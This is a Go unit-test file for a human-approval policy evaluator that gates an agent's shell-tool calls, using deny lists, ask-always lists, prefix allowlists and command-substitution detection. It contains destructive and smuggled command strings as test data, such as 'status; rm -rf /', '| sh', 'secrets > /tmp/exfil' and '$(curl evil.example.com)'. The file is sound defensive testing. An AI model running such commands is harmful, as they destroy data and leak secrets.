package hitlservice_test

import (
	"context"
	"testing"

	"github.com/contenox/beam/internal/libtracker"
	"github.com/contenox/beam/internal/services/hitlservice"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// shellPolicy writes a local_shell policy with the given rules and returns an Evaluator.
func shellPolicy(t *testing.T, rulesJSON string) hitlservice.PolicyEvaluator {
	t.Helper()
	dir := t.TempDir()
	src := hitlservice.NewFSPolicySource(dir)
	writePolicy(t, dir, "hitl-policy.json", []byte(`{"default_action":"allow","rules":[`+rulesJSON+`]}`))
	return hitlservice.New(src, testTenant, fixedKVReader{"hitl-policy.json"}, libtracker.NoopTracker{})
}

// TestUnit_Evaluate_CommandBlacklist_MatchesBareBasename verifies that
// OpCommandBlacklist fires when the command basename is in the list.
func TestUnit_Evaluate_CommandBlacklist_MatchesBareBasename(t *testing.T) {
	t.Parallel()
	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"deny","when":[{"key":"command","op":"command_blacklist","value":"mkfs,fdisk,shred"}]}`)

	denied := []map[string]any{
		{"command": "mkfs"},
		{"command": "/sbin/mkfs"},
		{"command": "fdisk"},
		{"command": "/usr/sbin/fdisk"},
		{"command": "shred"},
	}
	for _, args := range denied {
		r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", args)
		require.NoError(t, err)
		assert.Equal(t, hitlservice.ActionDeny, r.Action, "command_blacklist must deny %v", args)
	}
}

// TestUnit_Evaluate_CommandBlacklist_MultiwordEntryNeverMatches documents the known
// limitation: entries like "rm -rf" contain a space and will never equal the extracted
// command basename ("rm"). Policy authors must use bare names only.
func TestUnit_Evaluate_CommandBlacklist_MultiwordEntryNeverMatches(t *testing.T) {
	t.Parallel()
	// Rule with the multi-word "rm -rf" value.
	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"deny","when":[{"key":"command","op":"command_blacklist","value":"rm -rf"}]}`)

	// "rm" alone does NOT match "rm -rf" because the matcher compares basenames.
	r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", map[string]any{"command": "rm"})
	require.NoError(t, err)
	assert.Equal(t, hitlservice.ActionAllow, r.Action, "multi-word blacklist entry 'rm -rf' must not match basename 'rm'")
}

// TestUnit_Evaluate_CommandBlacklist_NonMatchingCommandPasses verifies that commands
// not in the blacklist are not blocked by the blacklist rule.
func TestUnit_Evaluate_CommandBlacklist_NonMatchingCommandPasses(t *testing.T) {
	t.Parallel()
	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"deny","when":[{"key":"command","op":"command_blacklist","value":"mkfs,fdisk"}]}`)

	allowed := []map[string]any{
		{"command": "git"},
		{"command": "cargo"},
		{"command": "make"},
		{"command": "/usr/bin/grep"},
	}
	for _, args := range allowed {
		r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", args)
		require.NoError(t, err)
		assert.Equal(t, hitlservice.ActionAllow, r.Action, "non-blacklisted command must not be denied: %v", args)
	}
}

// TestUnit_Evaluate_CommandBlacklist_EmptyListNeverMatches verifies that an empty
// blacklist value skips the check entirely and does not block anything.
func TestUnit_Evaluate_CommandBlacklist_EmptyListNeverMatches(t *testing.T) {
	t.Parallel()
	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"deny","when":[{"key":"command","op":"command_blacklist","value":""}]}`)

	r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", map[string]any{"command": "rm"})
	require.NoError(t, err)
	assert.Equal(t, hitlservice.ActionAllow, r.Action, "empty blacklist must not match anything")
}

// TestUnit_Evaluate_CommandAskAlways_MatchesListedCommand verifies that
// OpCommandAskAlways triggers approval for commands in the ask-always list.
func TestUnit_Evaluate_CommandAskAlways_MatchesListedCommand(t *testing.T) {
	t.Parallel()
	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"approve","when":[{"key":"command","op":"command_ask_always","value":"rm,sudo,dd"}]}`)

	flagged := []map[string]any{
		{"command": "rm"},
		{"command": "/bin/rm"},
		{"command": "sudo"},
		{"command": "dd"},
	}
	for _, args := range flagged {
		r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", args)
		require.NoError(t, err)
		assert.Equal(t, hitlservice.ActionApprove, r.Action, "command_ask_always must require approval for %v", args)
	}
}

// TestUnit_Evaluate_CommandAskAlways_UnlistedCommandPasses verifies that commands
// not in the ask-always list fall through to the next rule.
func TestUnit_Evaluate_CommandAskAlways_UnlistedCommandPasses(t *testing.T) {
	t.Parallel()
	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"approve","when":[{"key":"command","op":"command_ask_always","value":"rm,sudo"}]}`)

	r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", map[string]any{"command": "git"})
	require.NoError(t, err)
	assert.Equal(t, hitlservice.ActionAllow, r.Action, "unlisted command must not be caught by ask-always rule")
}

// TestUnit_Evaluate_NoCommandSubstitution_BlocksShellMetachars verifies that
// $() and backtick substitution patterns trigger the rule.
func TestUnit_Evaluate_NoCommandSubstitution_BlocksShellMetachars(t *testing.T) {
	t.Parallel()
	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"approve","when":[{"key":"args","op":"no_command_substitution","value":""}]}`)

	suspicious := []map[string]any{
		{"command": "echo", "args": "$(whoami)"},
		{"command": "ls", "args": "`pwd`"},
		{"command": "cat", "args": "<(ls /)"},
		{"command": "echo", "args": ">(tee /tmp/x)"},
		{"command": "echo", "args": "$((1+1))"},
	}
	for _, args := range suspicious {
		r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", args)
		require.NoError(t, err)
		assert.Equal(t, hitlservice.ActionApprove, r.Action, "command substitution pattern must require approval: %v", args)
	}
}

// TestUnit_Evaluate_NoCommandSubstitution_AllowsPlainEnvVars documents that
// simple $VAR references (without parens/braces) do not trigger the check.
func TestUnit_Evaluate_NoCommandSubstitution_AllowsPlainEnvVars(t *testing.T) {
	t.Parallel()
	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"approve","when":[{"key":"args","op":"no_command_substitution","value":""}]}`)

	// $VAR alone (no parens) is not in commandSubstitutionPatterns — must pass.
	r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", map[string]any{
		"command": "echo",
		"args":    "$HOME/projects",
	})
	require.NoError(t, err)
	assert.Equal(t, hitlservice.ActionAllow, r.Action, "plain $VAR reference must not trigger substitution block")
}

// TestUnit_Evaluate_NoCommandSubstitution_DollarBraceDoesNotBlockVarRef verifies that
// normal parameter expansion like ${MY_VAR} does NOT trigger the substitution block.
// The pattern "${}` looks for the exact 3-char sequence "${}", which is not present
// in "${MY_VAR}" — the characters are "$", "{", "M", ... — so it correctly passes.
func TestUnit_Evaluate_NoCommandSubstitution_DollarBraceDoesNotBlockVarRef(t *testing.T) {
	t.Parallel()
	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"approve","when":[{"key":"args","op":"no_command_substitution","value":""}]}`)

	// ${MY_VAR} does not contain the literal "${}" pattern (would require "${" immediately
	// followed by "}"), so this must pass through and not require approval.
	r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", map[string]any{
		"command": "echo",
		"args":    "${MY_VAR}",
	})
	require.NoError(t, err)
	assert.Equal(t, hitlservice.ActionAllow, r.Action, "${MY_VAR} must not trigger substitution block — only the literal \"${}\" pattern would match")
}

// TestUnit_Evaluate_NoCommandSubstitution_CleanCommandPasses verifies that
// commands with no substitution patterns are not caught.
func TestUnit_Evaluate_NoCommandSubstitution_CleanCommandPasses(t *testing.T) {
	t.Parallel()
	svc := shellPolicy(t, `{"tools":"local_shell","tool":"local_shell","action":"approve","when":[{"key":"args","op":"no_command_substitution","value":""}]}`)

	clean := []map[string]any{
		{"command": "git", "args": "status --short"},
		{"command": "make", "args": "build"},
		{"command": "ls", "args": "-la /tmp"},
		{"command": "go", "args": "test ./..."},
	}
	for _, args := range clean {
		r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", args)
		require.NoError(t, err)
		assert.Equal(t, hitlservice.ActionAllow, r.Action, "clean command must not trigger substitution block: %v", args)
	}
}

// prefixAllowPolicy writes the shape the shipped envelopes use for the safe-verb
// tier: an allow rule over a prefix list, with everything else falling through to
// approve. The default_action is approve here (not allow, as shellPolicy uses) so
// "did the allow tier fire?" is a real question rather than the fallback.
func prefixAllowPolicy(t *testing.T, prefixes string) hitlservice.PolicyEvaluator {
	t.Helper()
	dir := t.TempDir()
	src := hitlservice.NewFSPolicySource(dir)
	writePolicy(t, dir, "hitl-policy.json", []byte(
		`{"default_action":"approve","rules":[{"tools":"local_shell","tool":"local_shell","action":"allow","when":[{"key":"command","op":"command_prefix_allowlist","value":"`+prefixes+`"}]}]}`))
	return hitlservice.New(src, testTenant, fixedKVReader{"hitl-policy.json"}, libtracker.NoopTracker{})
}

// TestUnit_Evaluate_CommandPrefixAllowlist_MatchesSafeVerbs is the point of the
// operator: the everyday read verbs stop asking.
func TestUnit_Evaluate_CommandPrefixAllowlist_MatchesSafeVerbs(t *testing.T) {
	t.Parallel()
	svc := prefixAllowPolicy(t, "git status,git log,go build,ls,cat")

	allowed := []map[string]any{
		{"command": "git", "args": []any{"status"}},
		{"command": "git", "args": "status --short"},
		{"command": "/usr/bin/git", "args": []any{"log", "--oneline", "-20"}},
		{"command": "go", "args": []any{"build", "./..."}},
		{"command": "ls"},
		{"command": "ls", "args": "-la internal"},
		{"command": "cat", "args": []any{"go.mod"}},
		// The command string may carry its own arguments.
		{"command": "git status"},
	}
	for _, args := range allowed {
		r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", args)
		require.NoError(t, err)
		assert.Equal(t, hitlservice.ActionAllow, r.Action, "safe verb must not ask: %v", args)
	}
}

// TestUnit_Evaluate_CommandPrefixAllowlist_UnlistedVerbStillAsks verifies the
// tier only ever ADDS quiet verbs: a sibling subcommand of an allowed one is not
// allowed by association.
func TestUnit_Evaluate_CommandPrefixAllowlist_UnlistedVerbStillAsks(t *testing.T) {
	t.Parallel()
	svc := prefixAllowPolicy(t, "git status,git log,go build,ls,cat")

	asks := []map[string]any{
		{"command": "git", "args": []any{"clean", "-fd"}},
		{"command": "git", "args": []any{"reset", "--hard"}},
		{"command": "git", "args": []any{"push"}},
		{"command": "go", "args": []any{"run", "./cmd/x"}},
		{"command": "git"},  // the bare program is not a listed prefix
		{"command": "gitk"}, // prefix matching is token-wise, not substring
		{"command": "rm", "args": "-rf /"},
		{"command": "curl", "args": "https://example.com"},
	}
	for _, args := range asks {
		r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", args)
		require.NoError(t, err)
		assert.Equal(t, hitlservice.ActionApprove, r.Action, "unlisted command must still ask: %v", args)
	}
}

// TestUnit_Evaluate_CommandPrefixAllowlist_RefusesNonArgvCalls is the property
// that makes the tier an allowlist rather than a hole: an allowed verb followed
// by a shell operator carries the rest of the line in with it, so such a call
// never matches a prefix at all.
func TestUnit_Evaluate_CommandPrefixAllowlist_RefusesNonArgvCalls(t *testing.T) {
	t.Parallel()
	svc := prefixAllowPolicy(t, "git status,ls,cat,echo")

	smuggled := []map[string]any{
		{"command": "git", "args": "status; rm -rf /"},
		{"command": "git", "args": []any{"status", "&&", "rm", "-rf", "/"}},
		{"command": "ls", "args": "| sh"},
		{"command": "cat", "args": "secrets > /tmp/exfil"},
		{"command": "echo", "args": "$(curl evil.example.com)"},
		{"command": "echo", "args": "`id`"},
		{"command": "git status; rm -rf /"},
		// Shell mode itself: whatever the first token is, the string is a
		// program, not an argv.
		{"command": "git", "args": []any{"status"}, "shell": true},
		{"command": "ls", "shell": "true"},
	}
	for _, args := range smuggled {
		r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", args)
		require.NoError(t, err)
		assert.Equal(t, hitlservice.ActionApprove, r.Action, "non-argv call must never match a prefix: %v", args)
	}
}

// TestUnit_Evaluate_CommandPrefixAllowlist_EmptyListNeverMatches keeps an
// unconfigured tier inert rather than accidentally universal.
func TestUnit_Evaluate_CommandPrefixAllowlist_EmptyListNeverMatches(t *testing.T) {
	t.Parallel()
	svc := prefixAllowPolicy(t, "")

	r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", map[string]any{"command": "ls"})
	require.NoError(t, err)
	assert.Equal(t, hitlservice.ActionApprove, r.Action, "an empty prefix list must match nothing")
}

// TestUnit_Evaluate_CommandPrefixAllowlist_OrderedBelowDenyTiers verifies the
// tier ordering the shipped envelopes rely on: a blacklisted or ask-always
// command keeps its verdict even when a later allow rule would have matched.
func TestUnit_Evaluate_CommandPrefixAllowlist_OrderedBelowDenyTiers(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	src := hitlservice.NewFSPolicySource(dir)
	writePolicy(t, dir, "hitl-policy.json", []byte(`{"default_action":"approve","rules":[
		{"tools":"local_shell","tool":"local_shell","action":"deny","when":[{"key":"command","op":"command_blacklist","value":"shred"}]},
		{"tools":"local_shell","tool":"local_shell","action":"approve","when":[{"key":"command","op":"command_ask_always","value":"cat"}]},
		{"tools":"local_shell","tool":"local_shell","action":"allow","when":[{"key":"command","op":"command_prefix_allowlist","value":"shred,cat,ls"}]}
	]}`))
	svc := hitlservice.New(src, testTenant, fixedKVReader{"hitl-policy.json"}, libtracker.NoopTracker{})

	r, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", map[string]any{"command": "shred"})
	require.NoError(t, err)
	assert.Equal(t, hitlservice.ActionDeny, r.Action, "a blacklisted command stays denied above the allow tier")

	r, err = svc.Evaluate(context.Background(), "local_shell", "local_shell", map[string]any{"command": "cat"})
	require.NoError(t, err)
	assert.Equal(t, hitlservice.ActionApprove, r.Action, "an ask-always command above the allow tier still asks")

	r, err = svc.Evaluate(context.Background(), "local_shell", "local_shell", map[string]any{"command": "ls"})
	require.NoError(t, err)
	assert.Equal(t, hitlservice.ActionAllow, r.Action)
}
